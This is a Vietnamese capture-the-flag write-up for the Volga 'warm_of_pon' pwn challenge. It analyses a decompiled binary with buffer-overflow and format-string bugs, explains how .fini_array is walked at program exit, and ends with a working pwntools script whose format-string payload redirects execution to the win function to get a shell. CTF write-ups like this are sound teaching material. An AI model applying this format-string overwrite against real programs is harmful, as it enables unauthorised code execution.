# volga

- Giải này mình thấy khá hay nên mình đã cố gắng write up lại. Cảm ơn `Crazyman` (Discord: `_cra2yman_`) đã chia sẻ solution.

## warm_of_pon

### Source

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v4; // [rsp+8h] [rbp-28h]
  char format[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 i; // [rsp+28h] [rbp-8h]
  __int64 savedregs; // [rsp+30h] [rbp+0h]
  void *retaddr; // [rsp+38h] [rbp+8h]

  setup(argc, argv, envp);
  v4 = 0LL;
  *(&savedregs - 305) = (unsigned __int64)malloc(8uLL) & 0xFFFFFFFFFFFFF000LL;
  *(_QWORD *)*(&savedregs - 305) = retaddr;
  gets(format);
  printf(format);
  for ( i = 0LL; i <= 0x20; ++i )
  {
    if ( *(_QWORD *)((i << 12) + *(&savedregs - 305)) )
      retaddr = *(void **)((i << 12) + *(&savedregs - 305));
  }
  return 0;
}
```

### Phân tích

- Chall này tồn tại 2 bug là BOF và FMT, nhưng chương trình đã copy `retaddr` là `saved rip` vào heap. Sau khi thực thi hàm `gets`, chương trình sẽ ghi lại giá trị của `saved rip`. Như vậy, nếu ta ghi đè `rip` thì cuối chương trình `retaddr` vẫn sẽ được ghi lại.

```c
  *(&savedregs - 305) = (unsigned __int64)malloc(8uLL) & 0xFFFFFFFFFFFFF000LL;
  *(_QWORD *)*(&savedregs - 305) = retaddr;
```

- Lúc giải còn trong thời gian, mình đã khá bối rối và quên mất rằng khi kết thúc chương trình, sẽ gọi một `.fini_array`.

```
0x0000000000403df0 - 0x0000000000403df8 is .fini_array
---
10:0080│+050 0x7fffffffdd60 —▸ 0x403df0 —▸ 0x401130 ◂— endbr64  // .fini_aray
11:0088│+058 0x7fffffffdd68 —▸ 0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2c0 ◂— 0x0
12:0090│+060 0x7fffffffdd70 ◂— 0x61af5347029bcff0
13:0098│+068 0x7fffffffdd78 ◂— 0x61af43036c53cff0
14:00a0│+070 0x7fffffffdd80 ◂— 0x0
... ↓     2 skipped
17:00b8│+088 0x7fffffffdd98 —▸ 0x7fffffffde28 —▸ 0x7fffffffe0b5 ◂— '/mnt/d/CTF/volga/warm_of_ponn/warm_of_pon_patched'
```

- Chúng ta cùng nhìn qua struct của `.fini_array`

```c
typedef void (*fini_t) (void);

typedef struct {
  uint32_t length;
  fini_t* array;
} __aword __attribute__((aligned(16))) .fini_array;
```

- Trong các bài thông thường, sẽ có 1 con trỏ chứa địa chỉ `array`, nhưng trong chall này sẽ không có con trỏ ấy mà thay vào đó ta sẽ có con trỏ trỏ đến `size`

```
1d:00e8│+0b8 0x7fffffffdde8 —▸ 0x403df0 —▸ 0x401130 ◂— endbr64 //base .fini_array
1e:00f0│+0c0 0x7fffffffddf0 —▸ 0x1555555552c0 ◂— 0x0 // con trỏ size
----
pwndbg> tel 0x1555555552c0
00:0000│  0x1555555552c0 ◂— 0x0 // size
01:0008│  0x1555555552c8 —▸ 0x155555555880 ◂— 0x0
02:0010│  0x1555555552d0 —▸ 0x3fe650 ◂— 0x1d
03:0018│  0x1555555552d8 —▸ 0x155555555890 —▸ 0x15555551d000 ◂— jg 0x15555551d047
```

- Ta thấy `i--` thì nếu `base + size = con trỏ win` thì ta có thể get shell

```c
__libc_csu_fini (void)
{
#ifndef LIBC_NONSHARED
  size_t i = __fini_array_end - __fini_array_start;
  while (i-- > 0)
    (*__fini_array_start [i]) ();

```

### script

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('warm_of_pon_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b* 0x40124F

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()

target = 0x00404070
main = 0x4011DD
fini_array = 0x403DF0
offset = target-fini_array

payload = f"%{offset}c%36$n%{exe.sym.win-offset}c%13$n".encode().ljust(0x28,b"a")+p64(target)
sl(payload)

p.interactive()

```
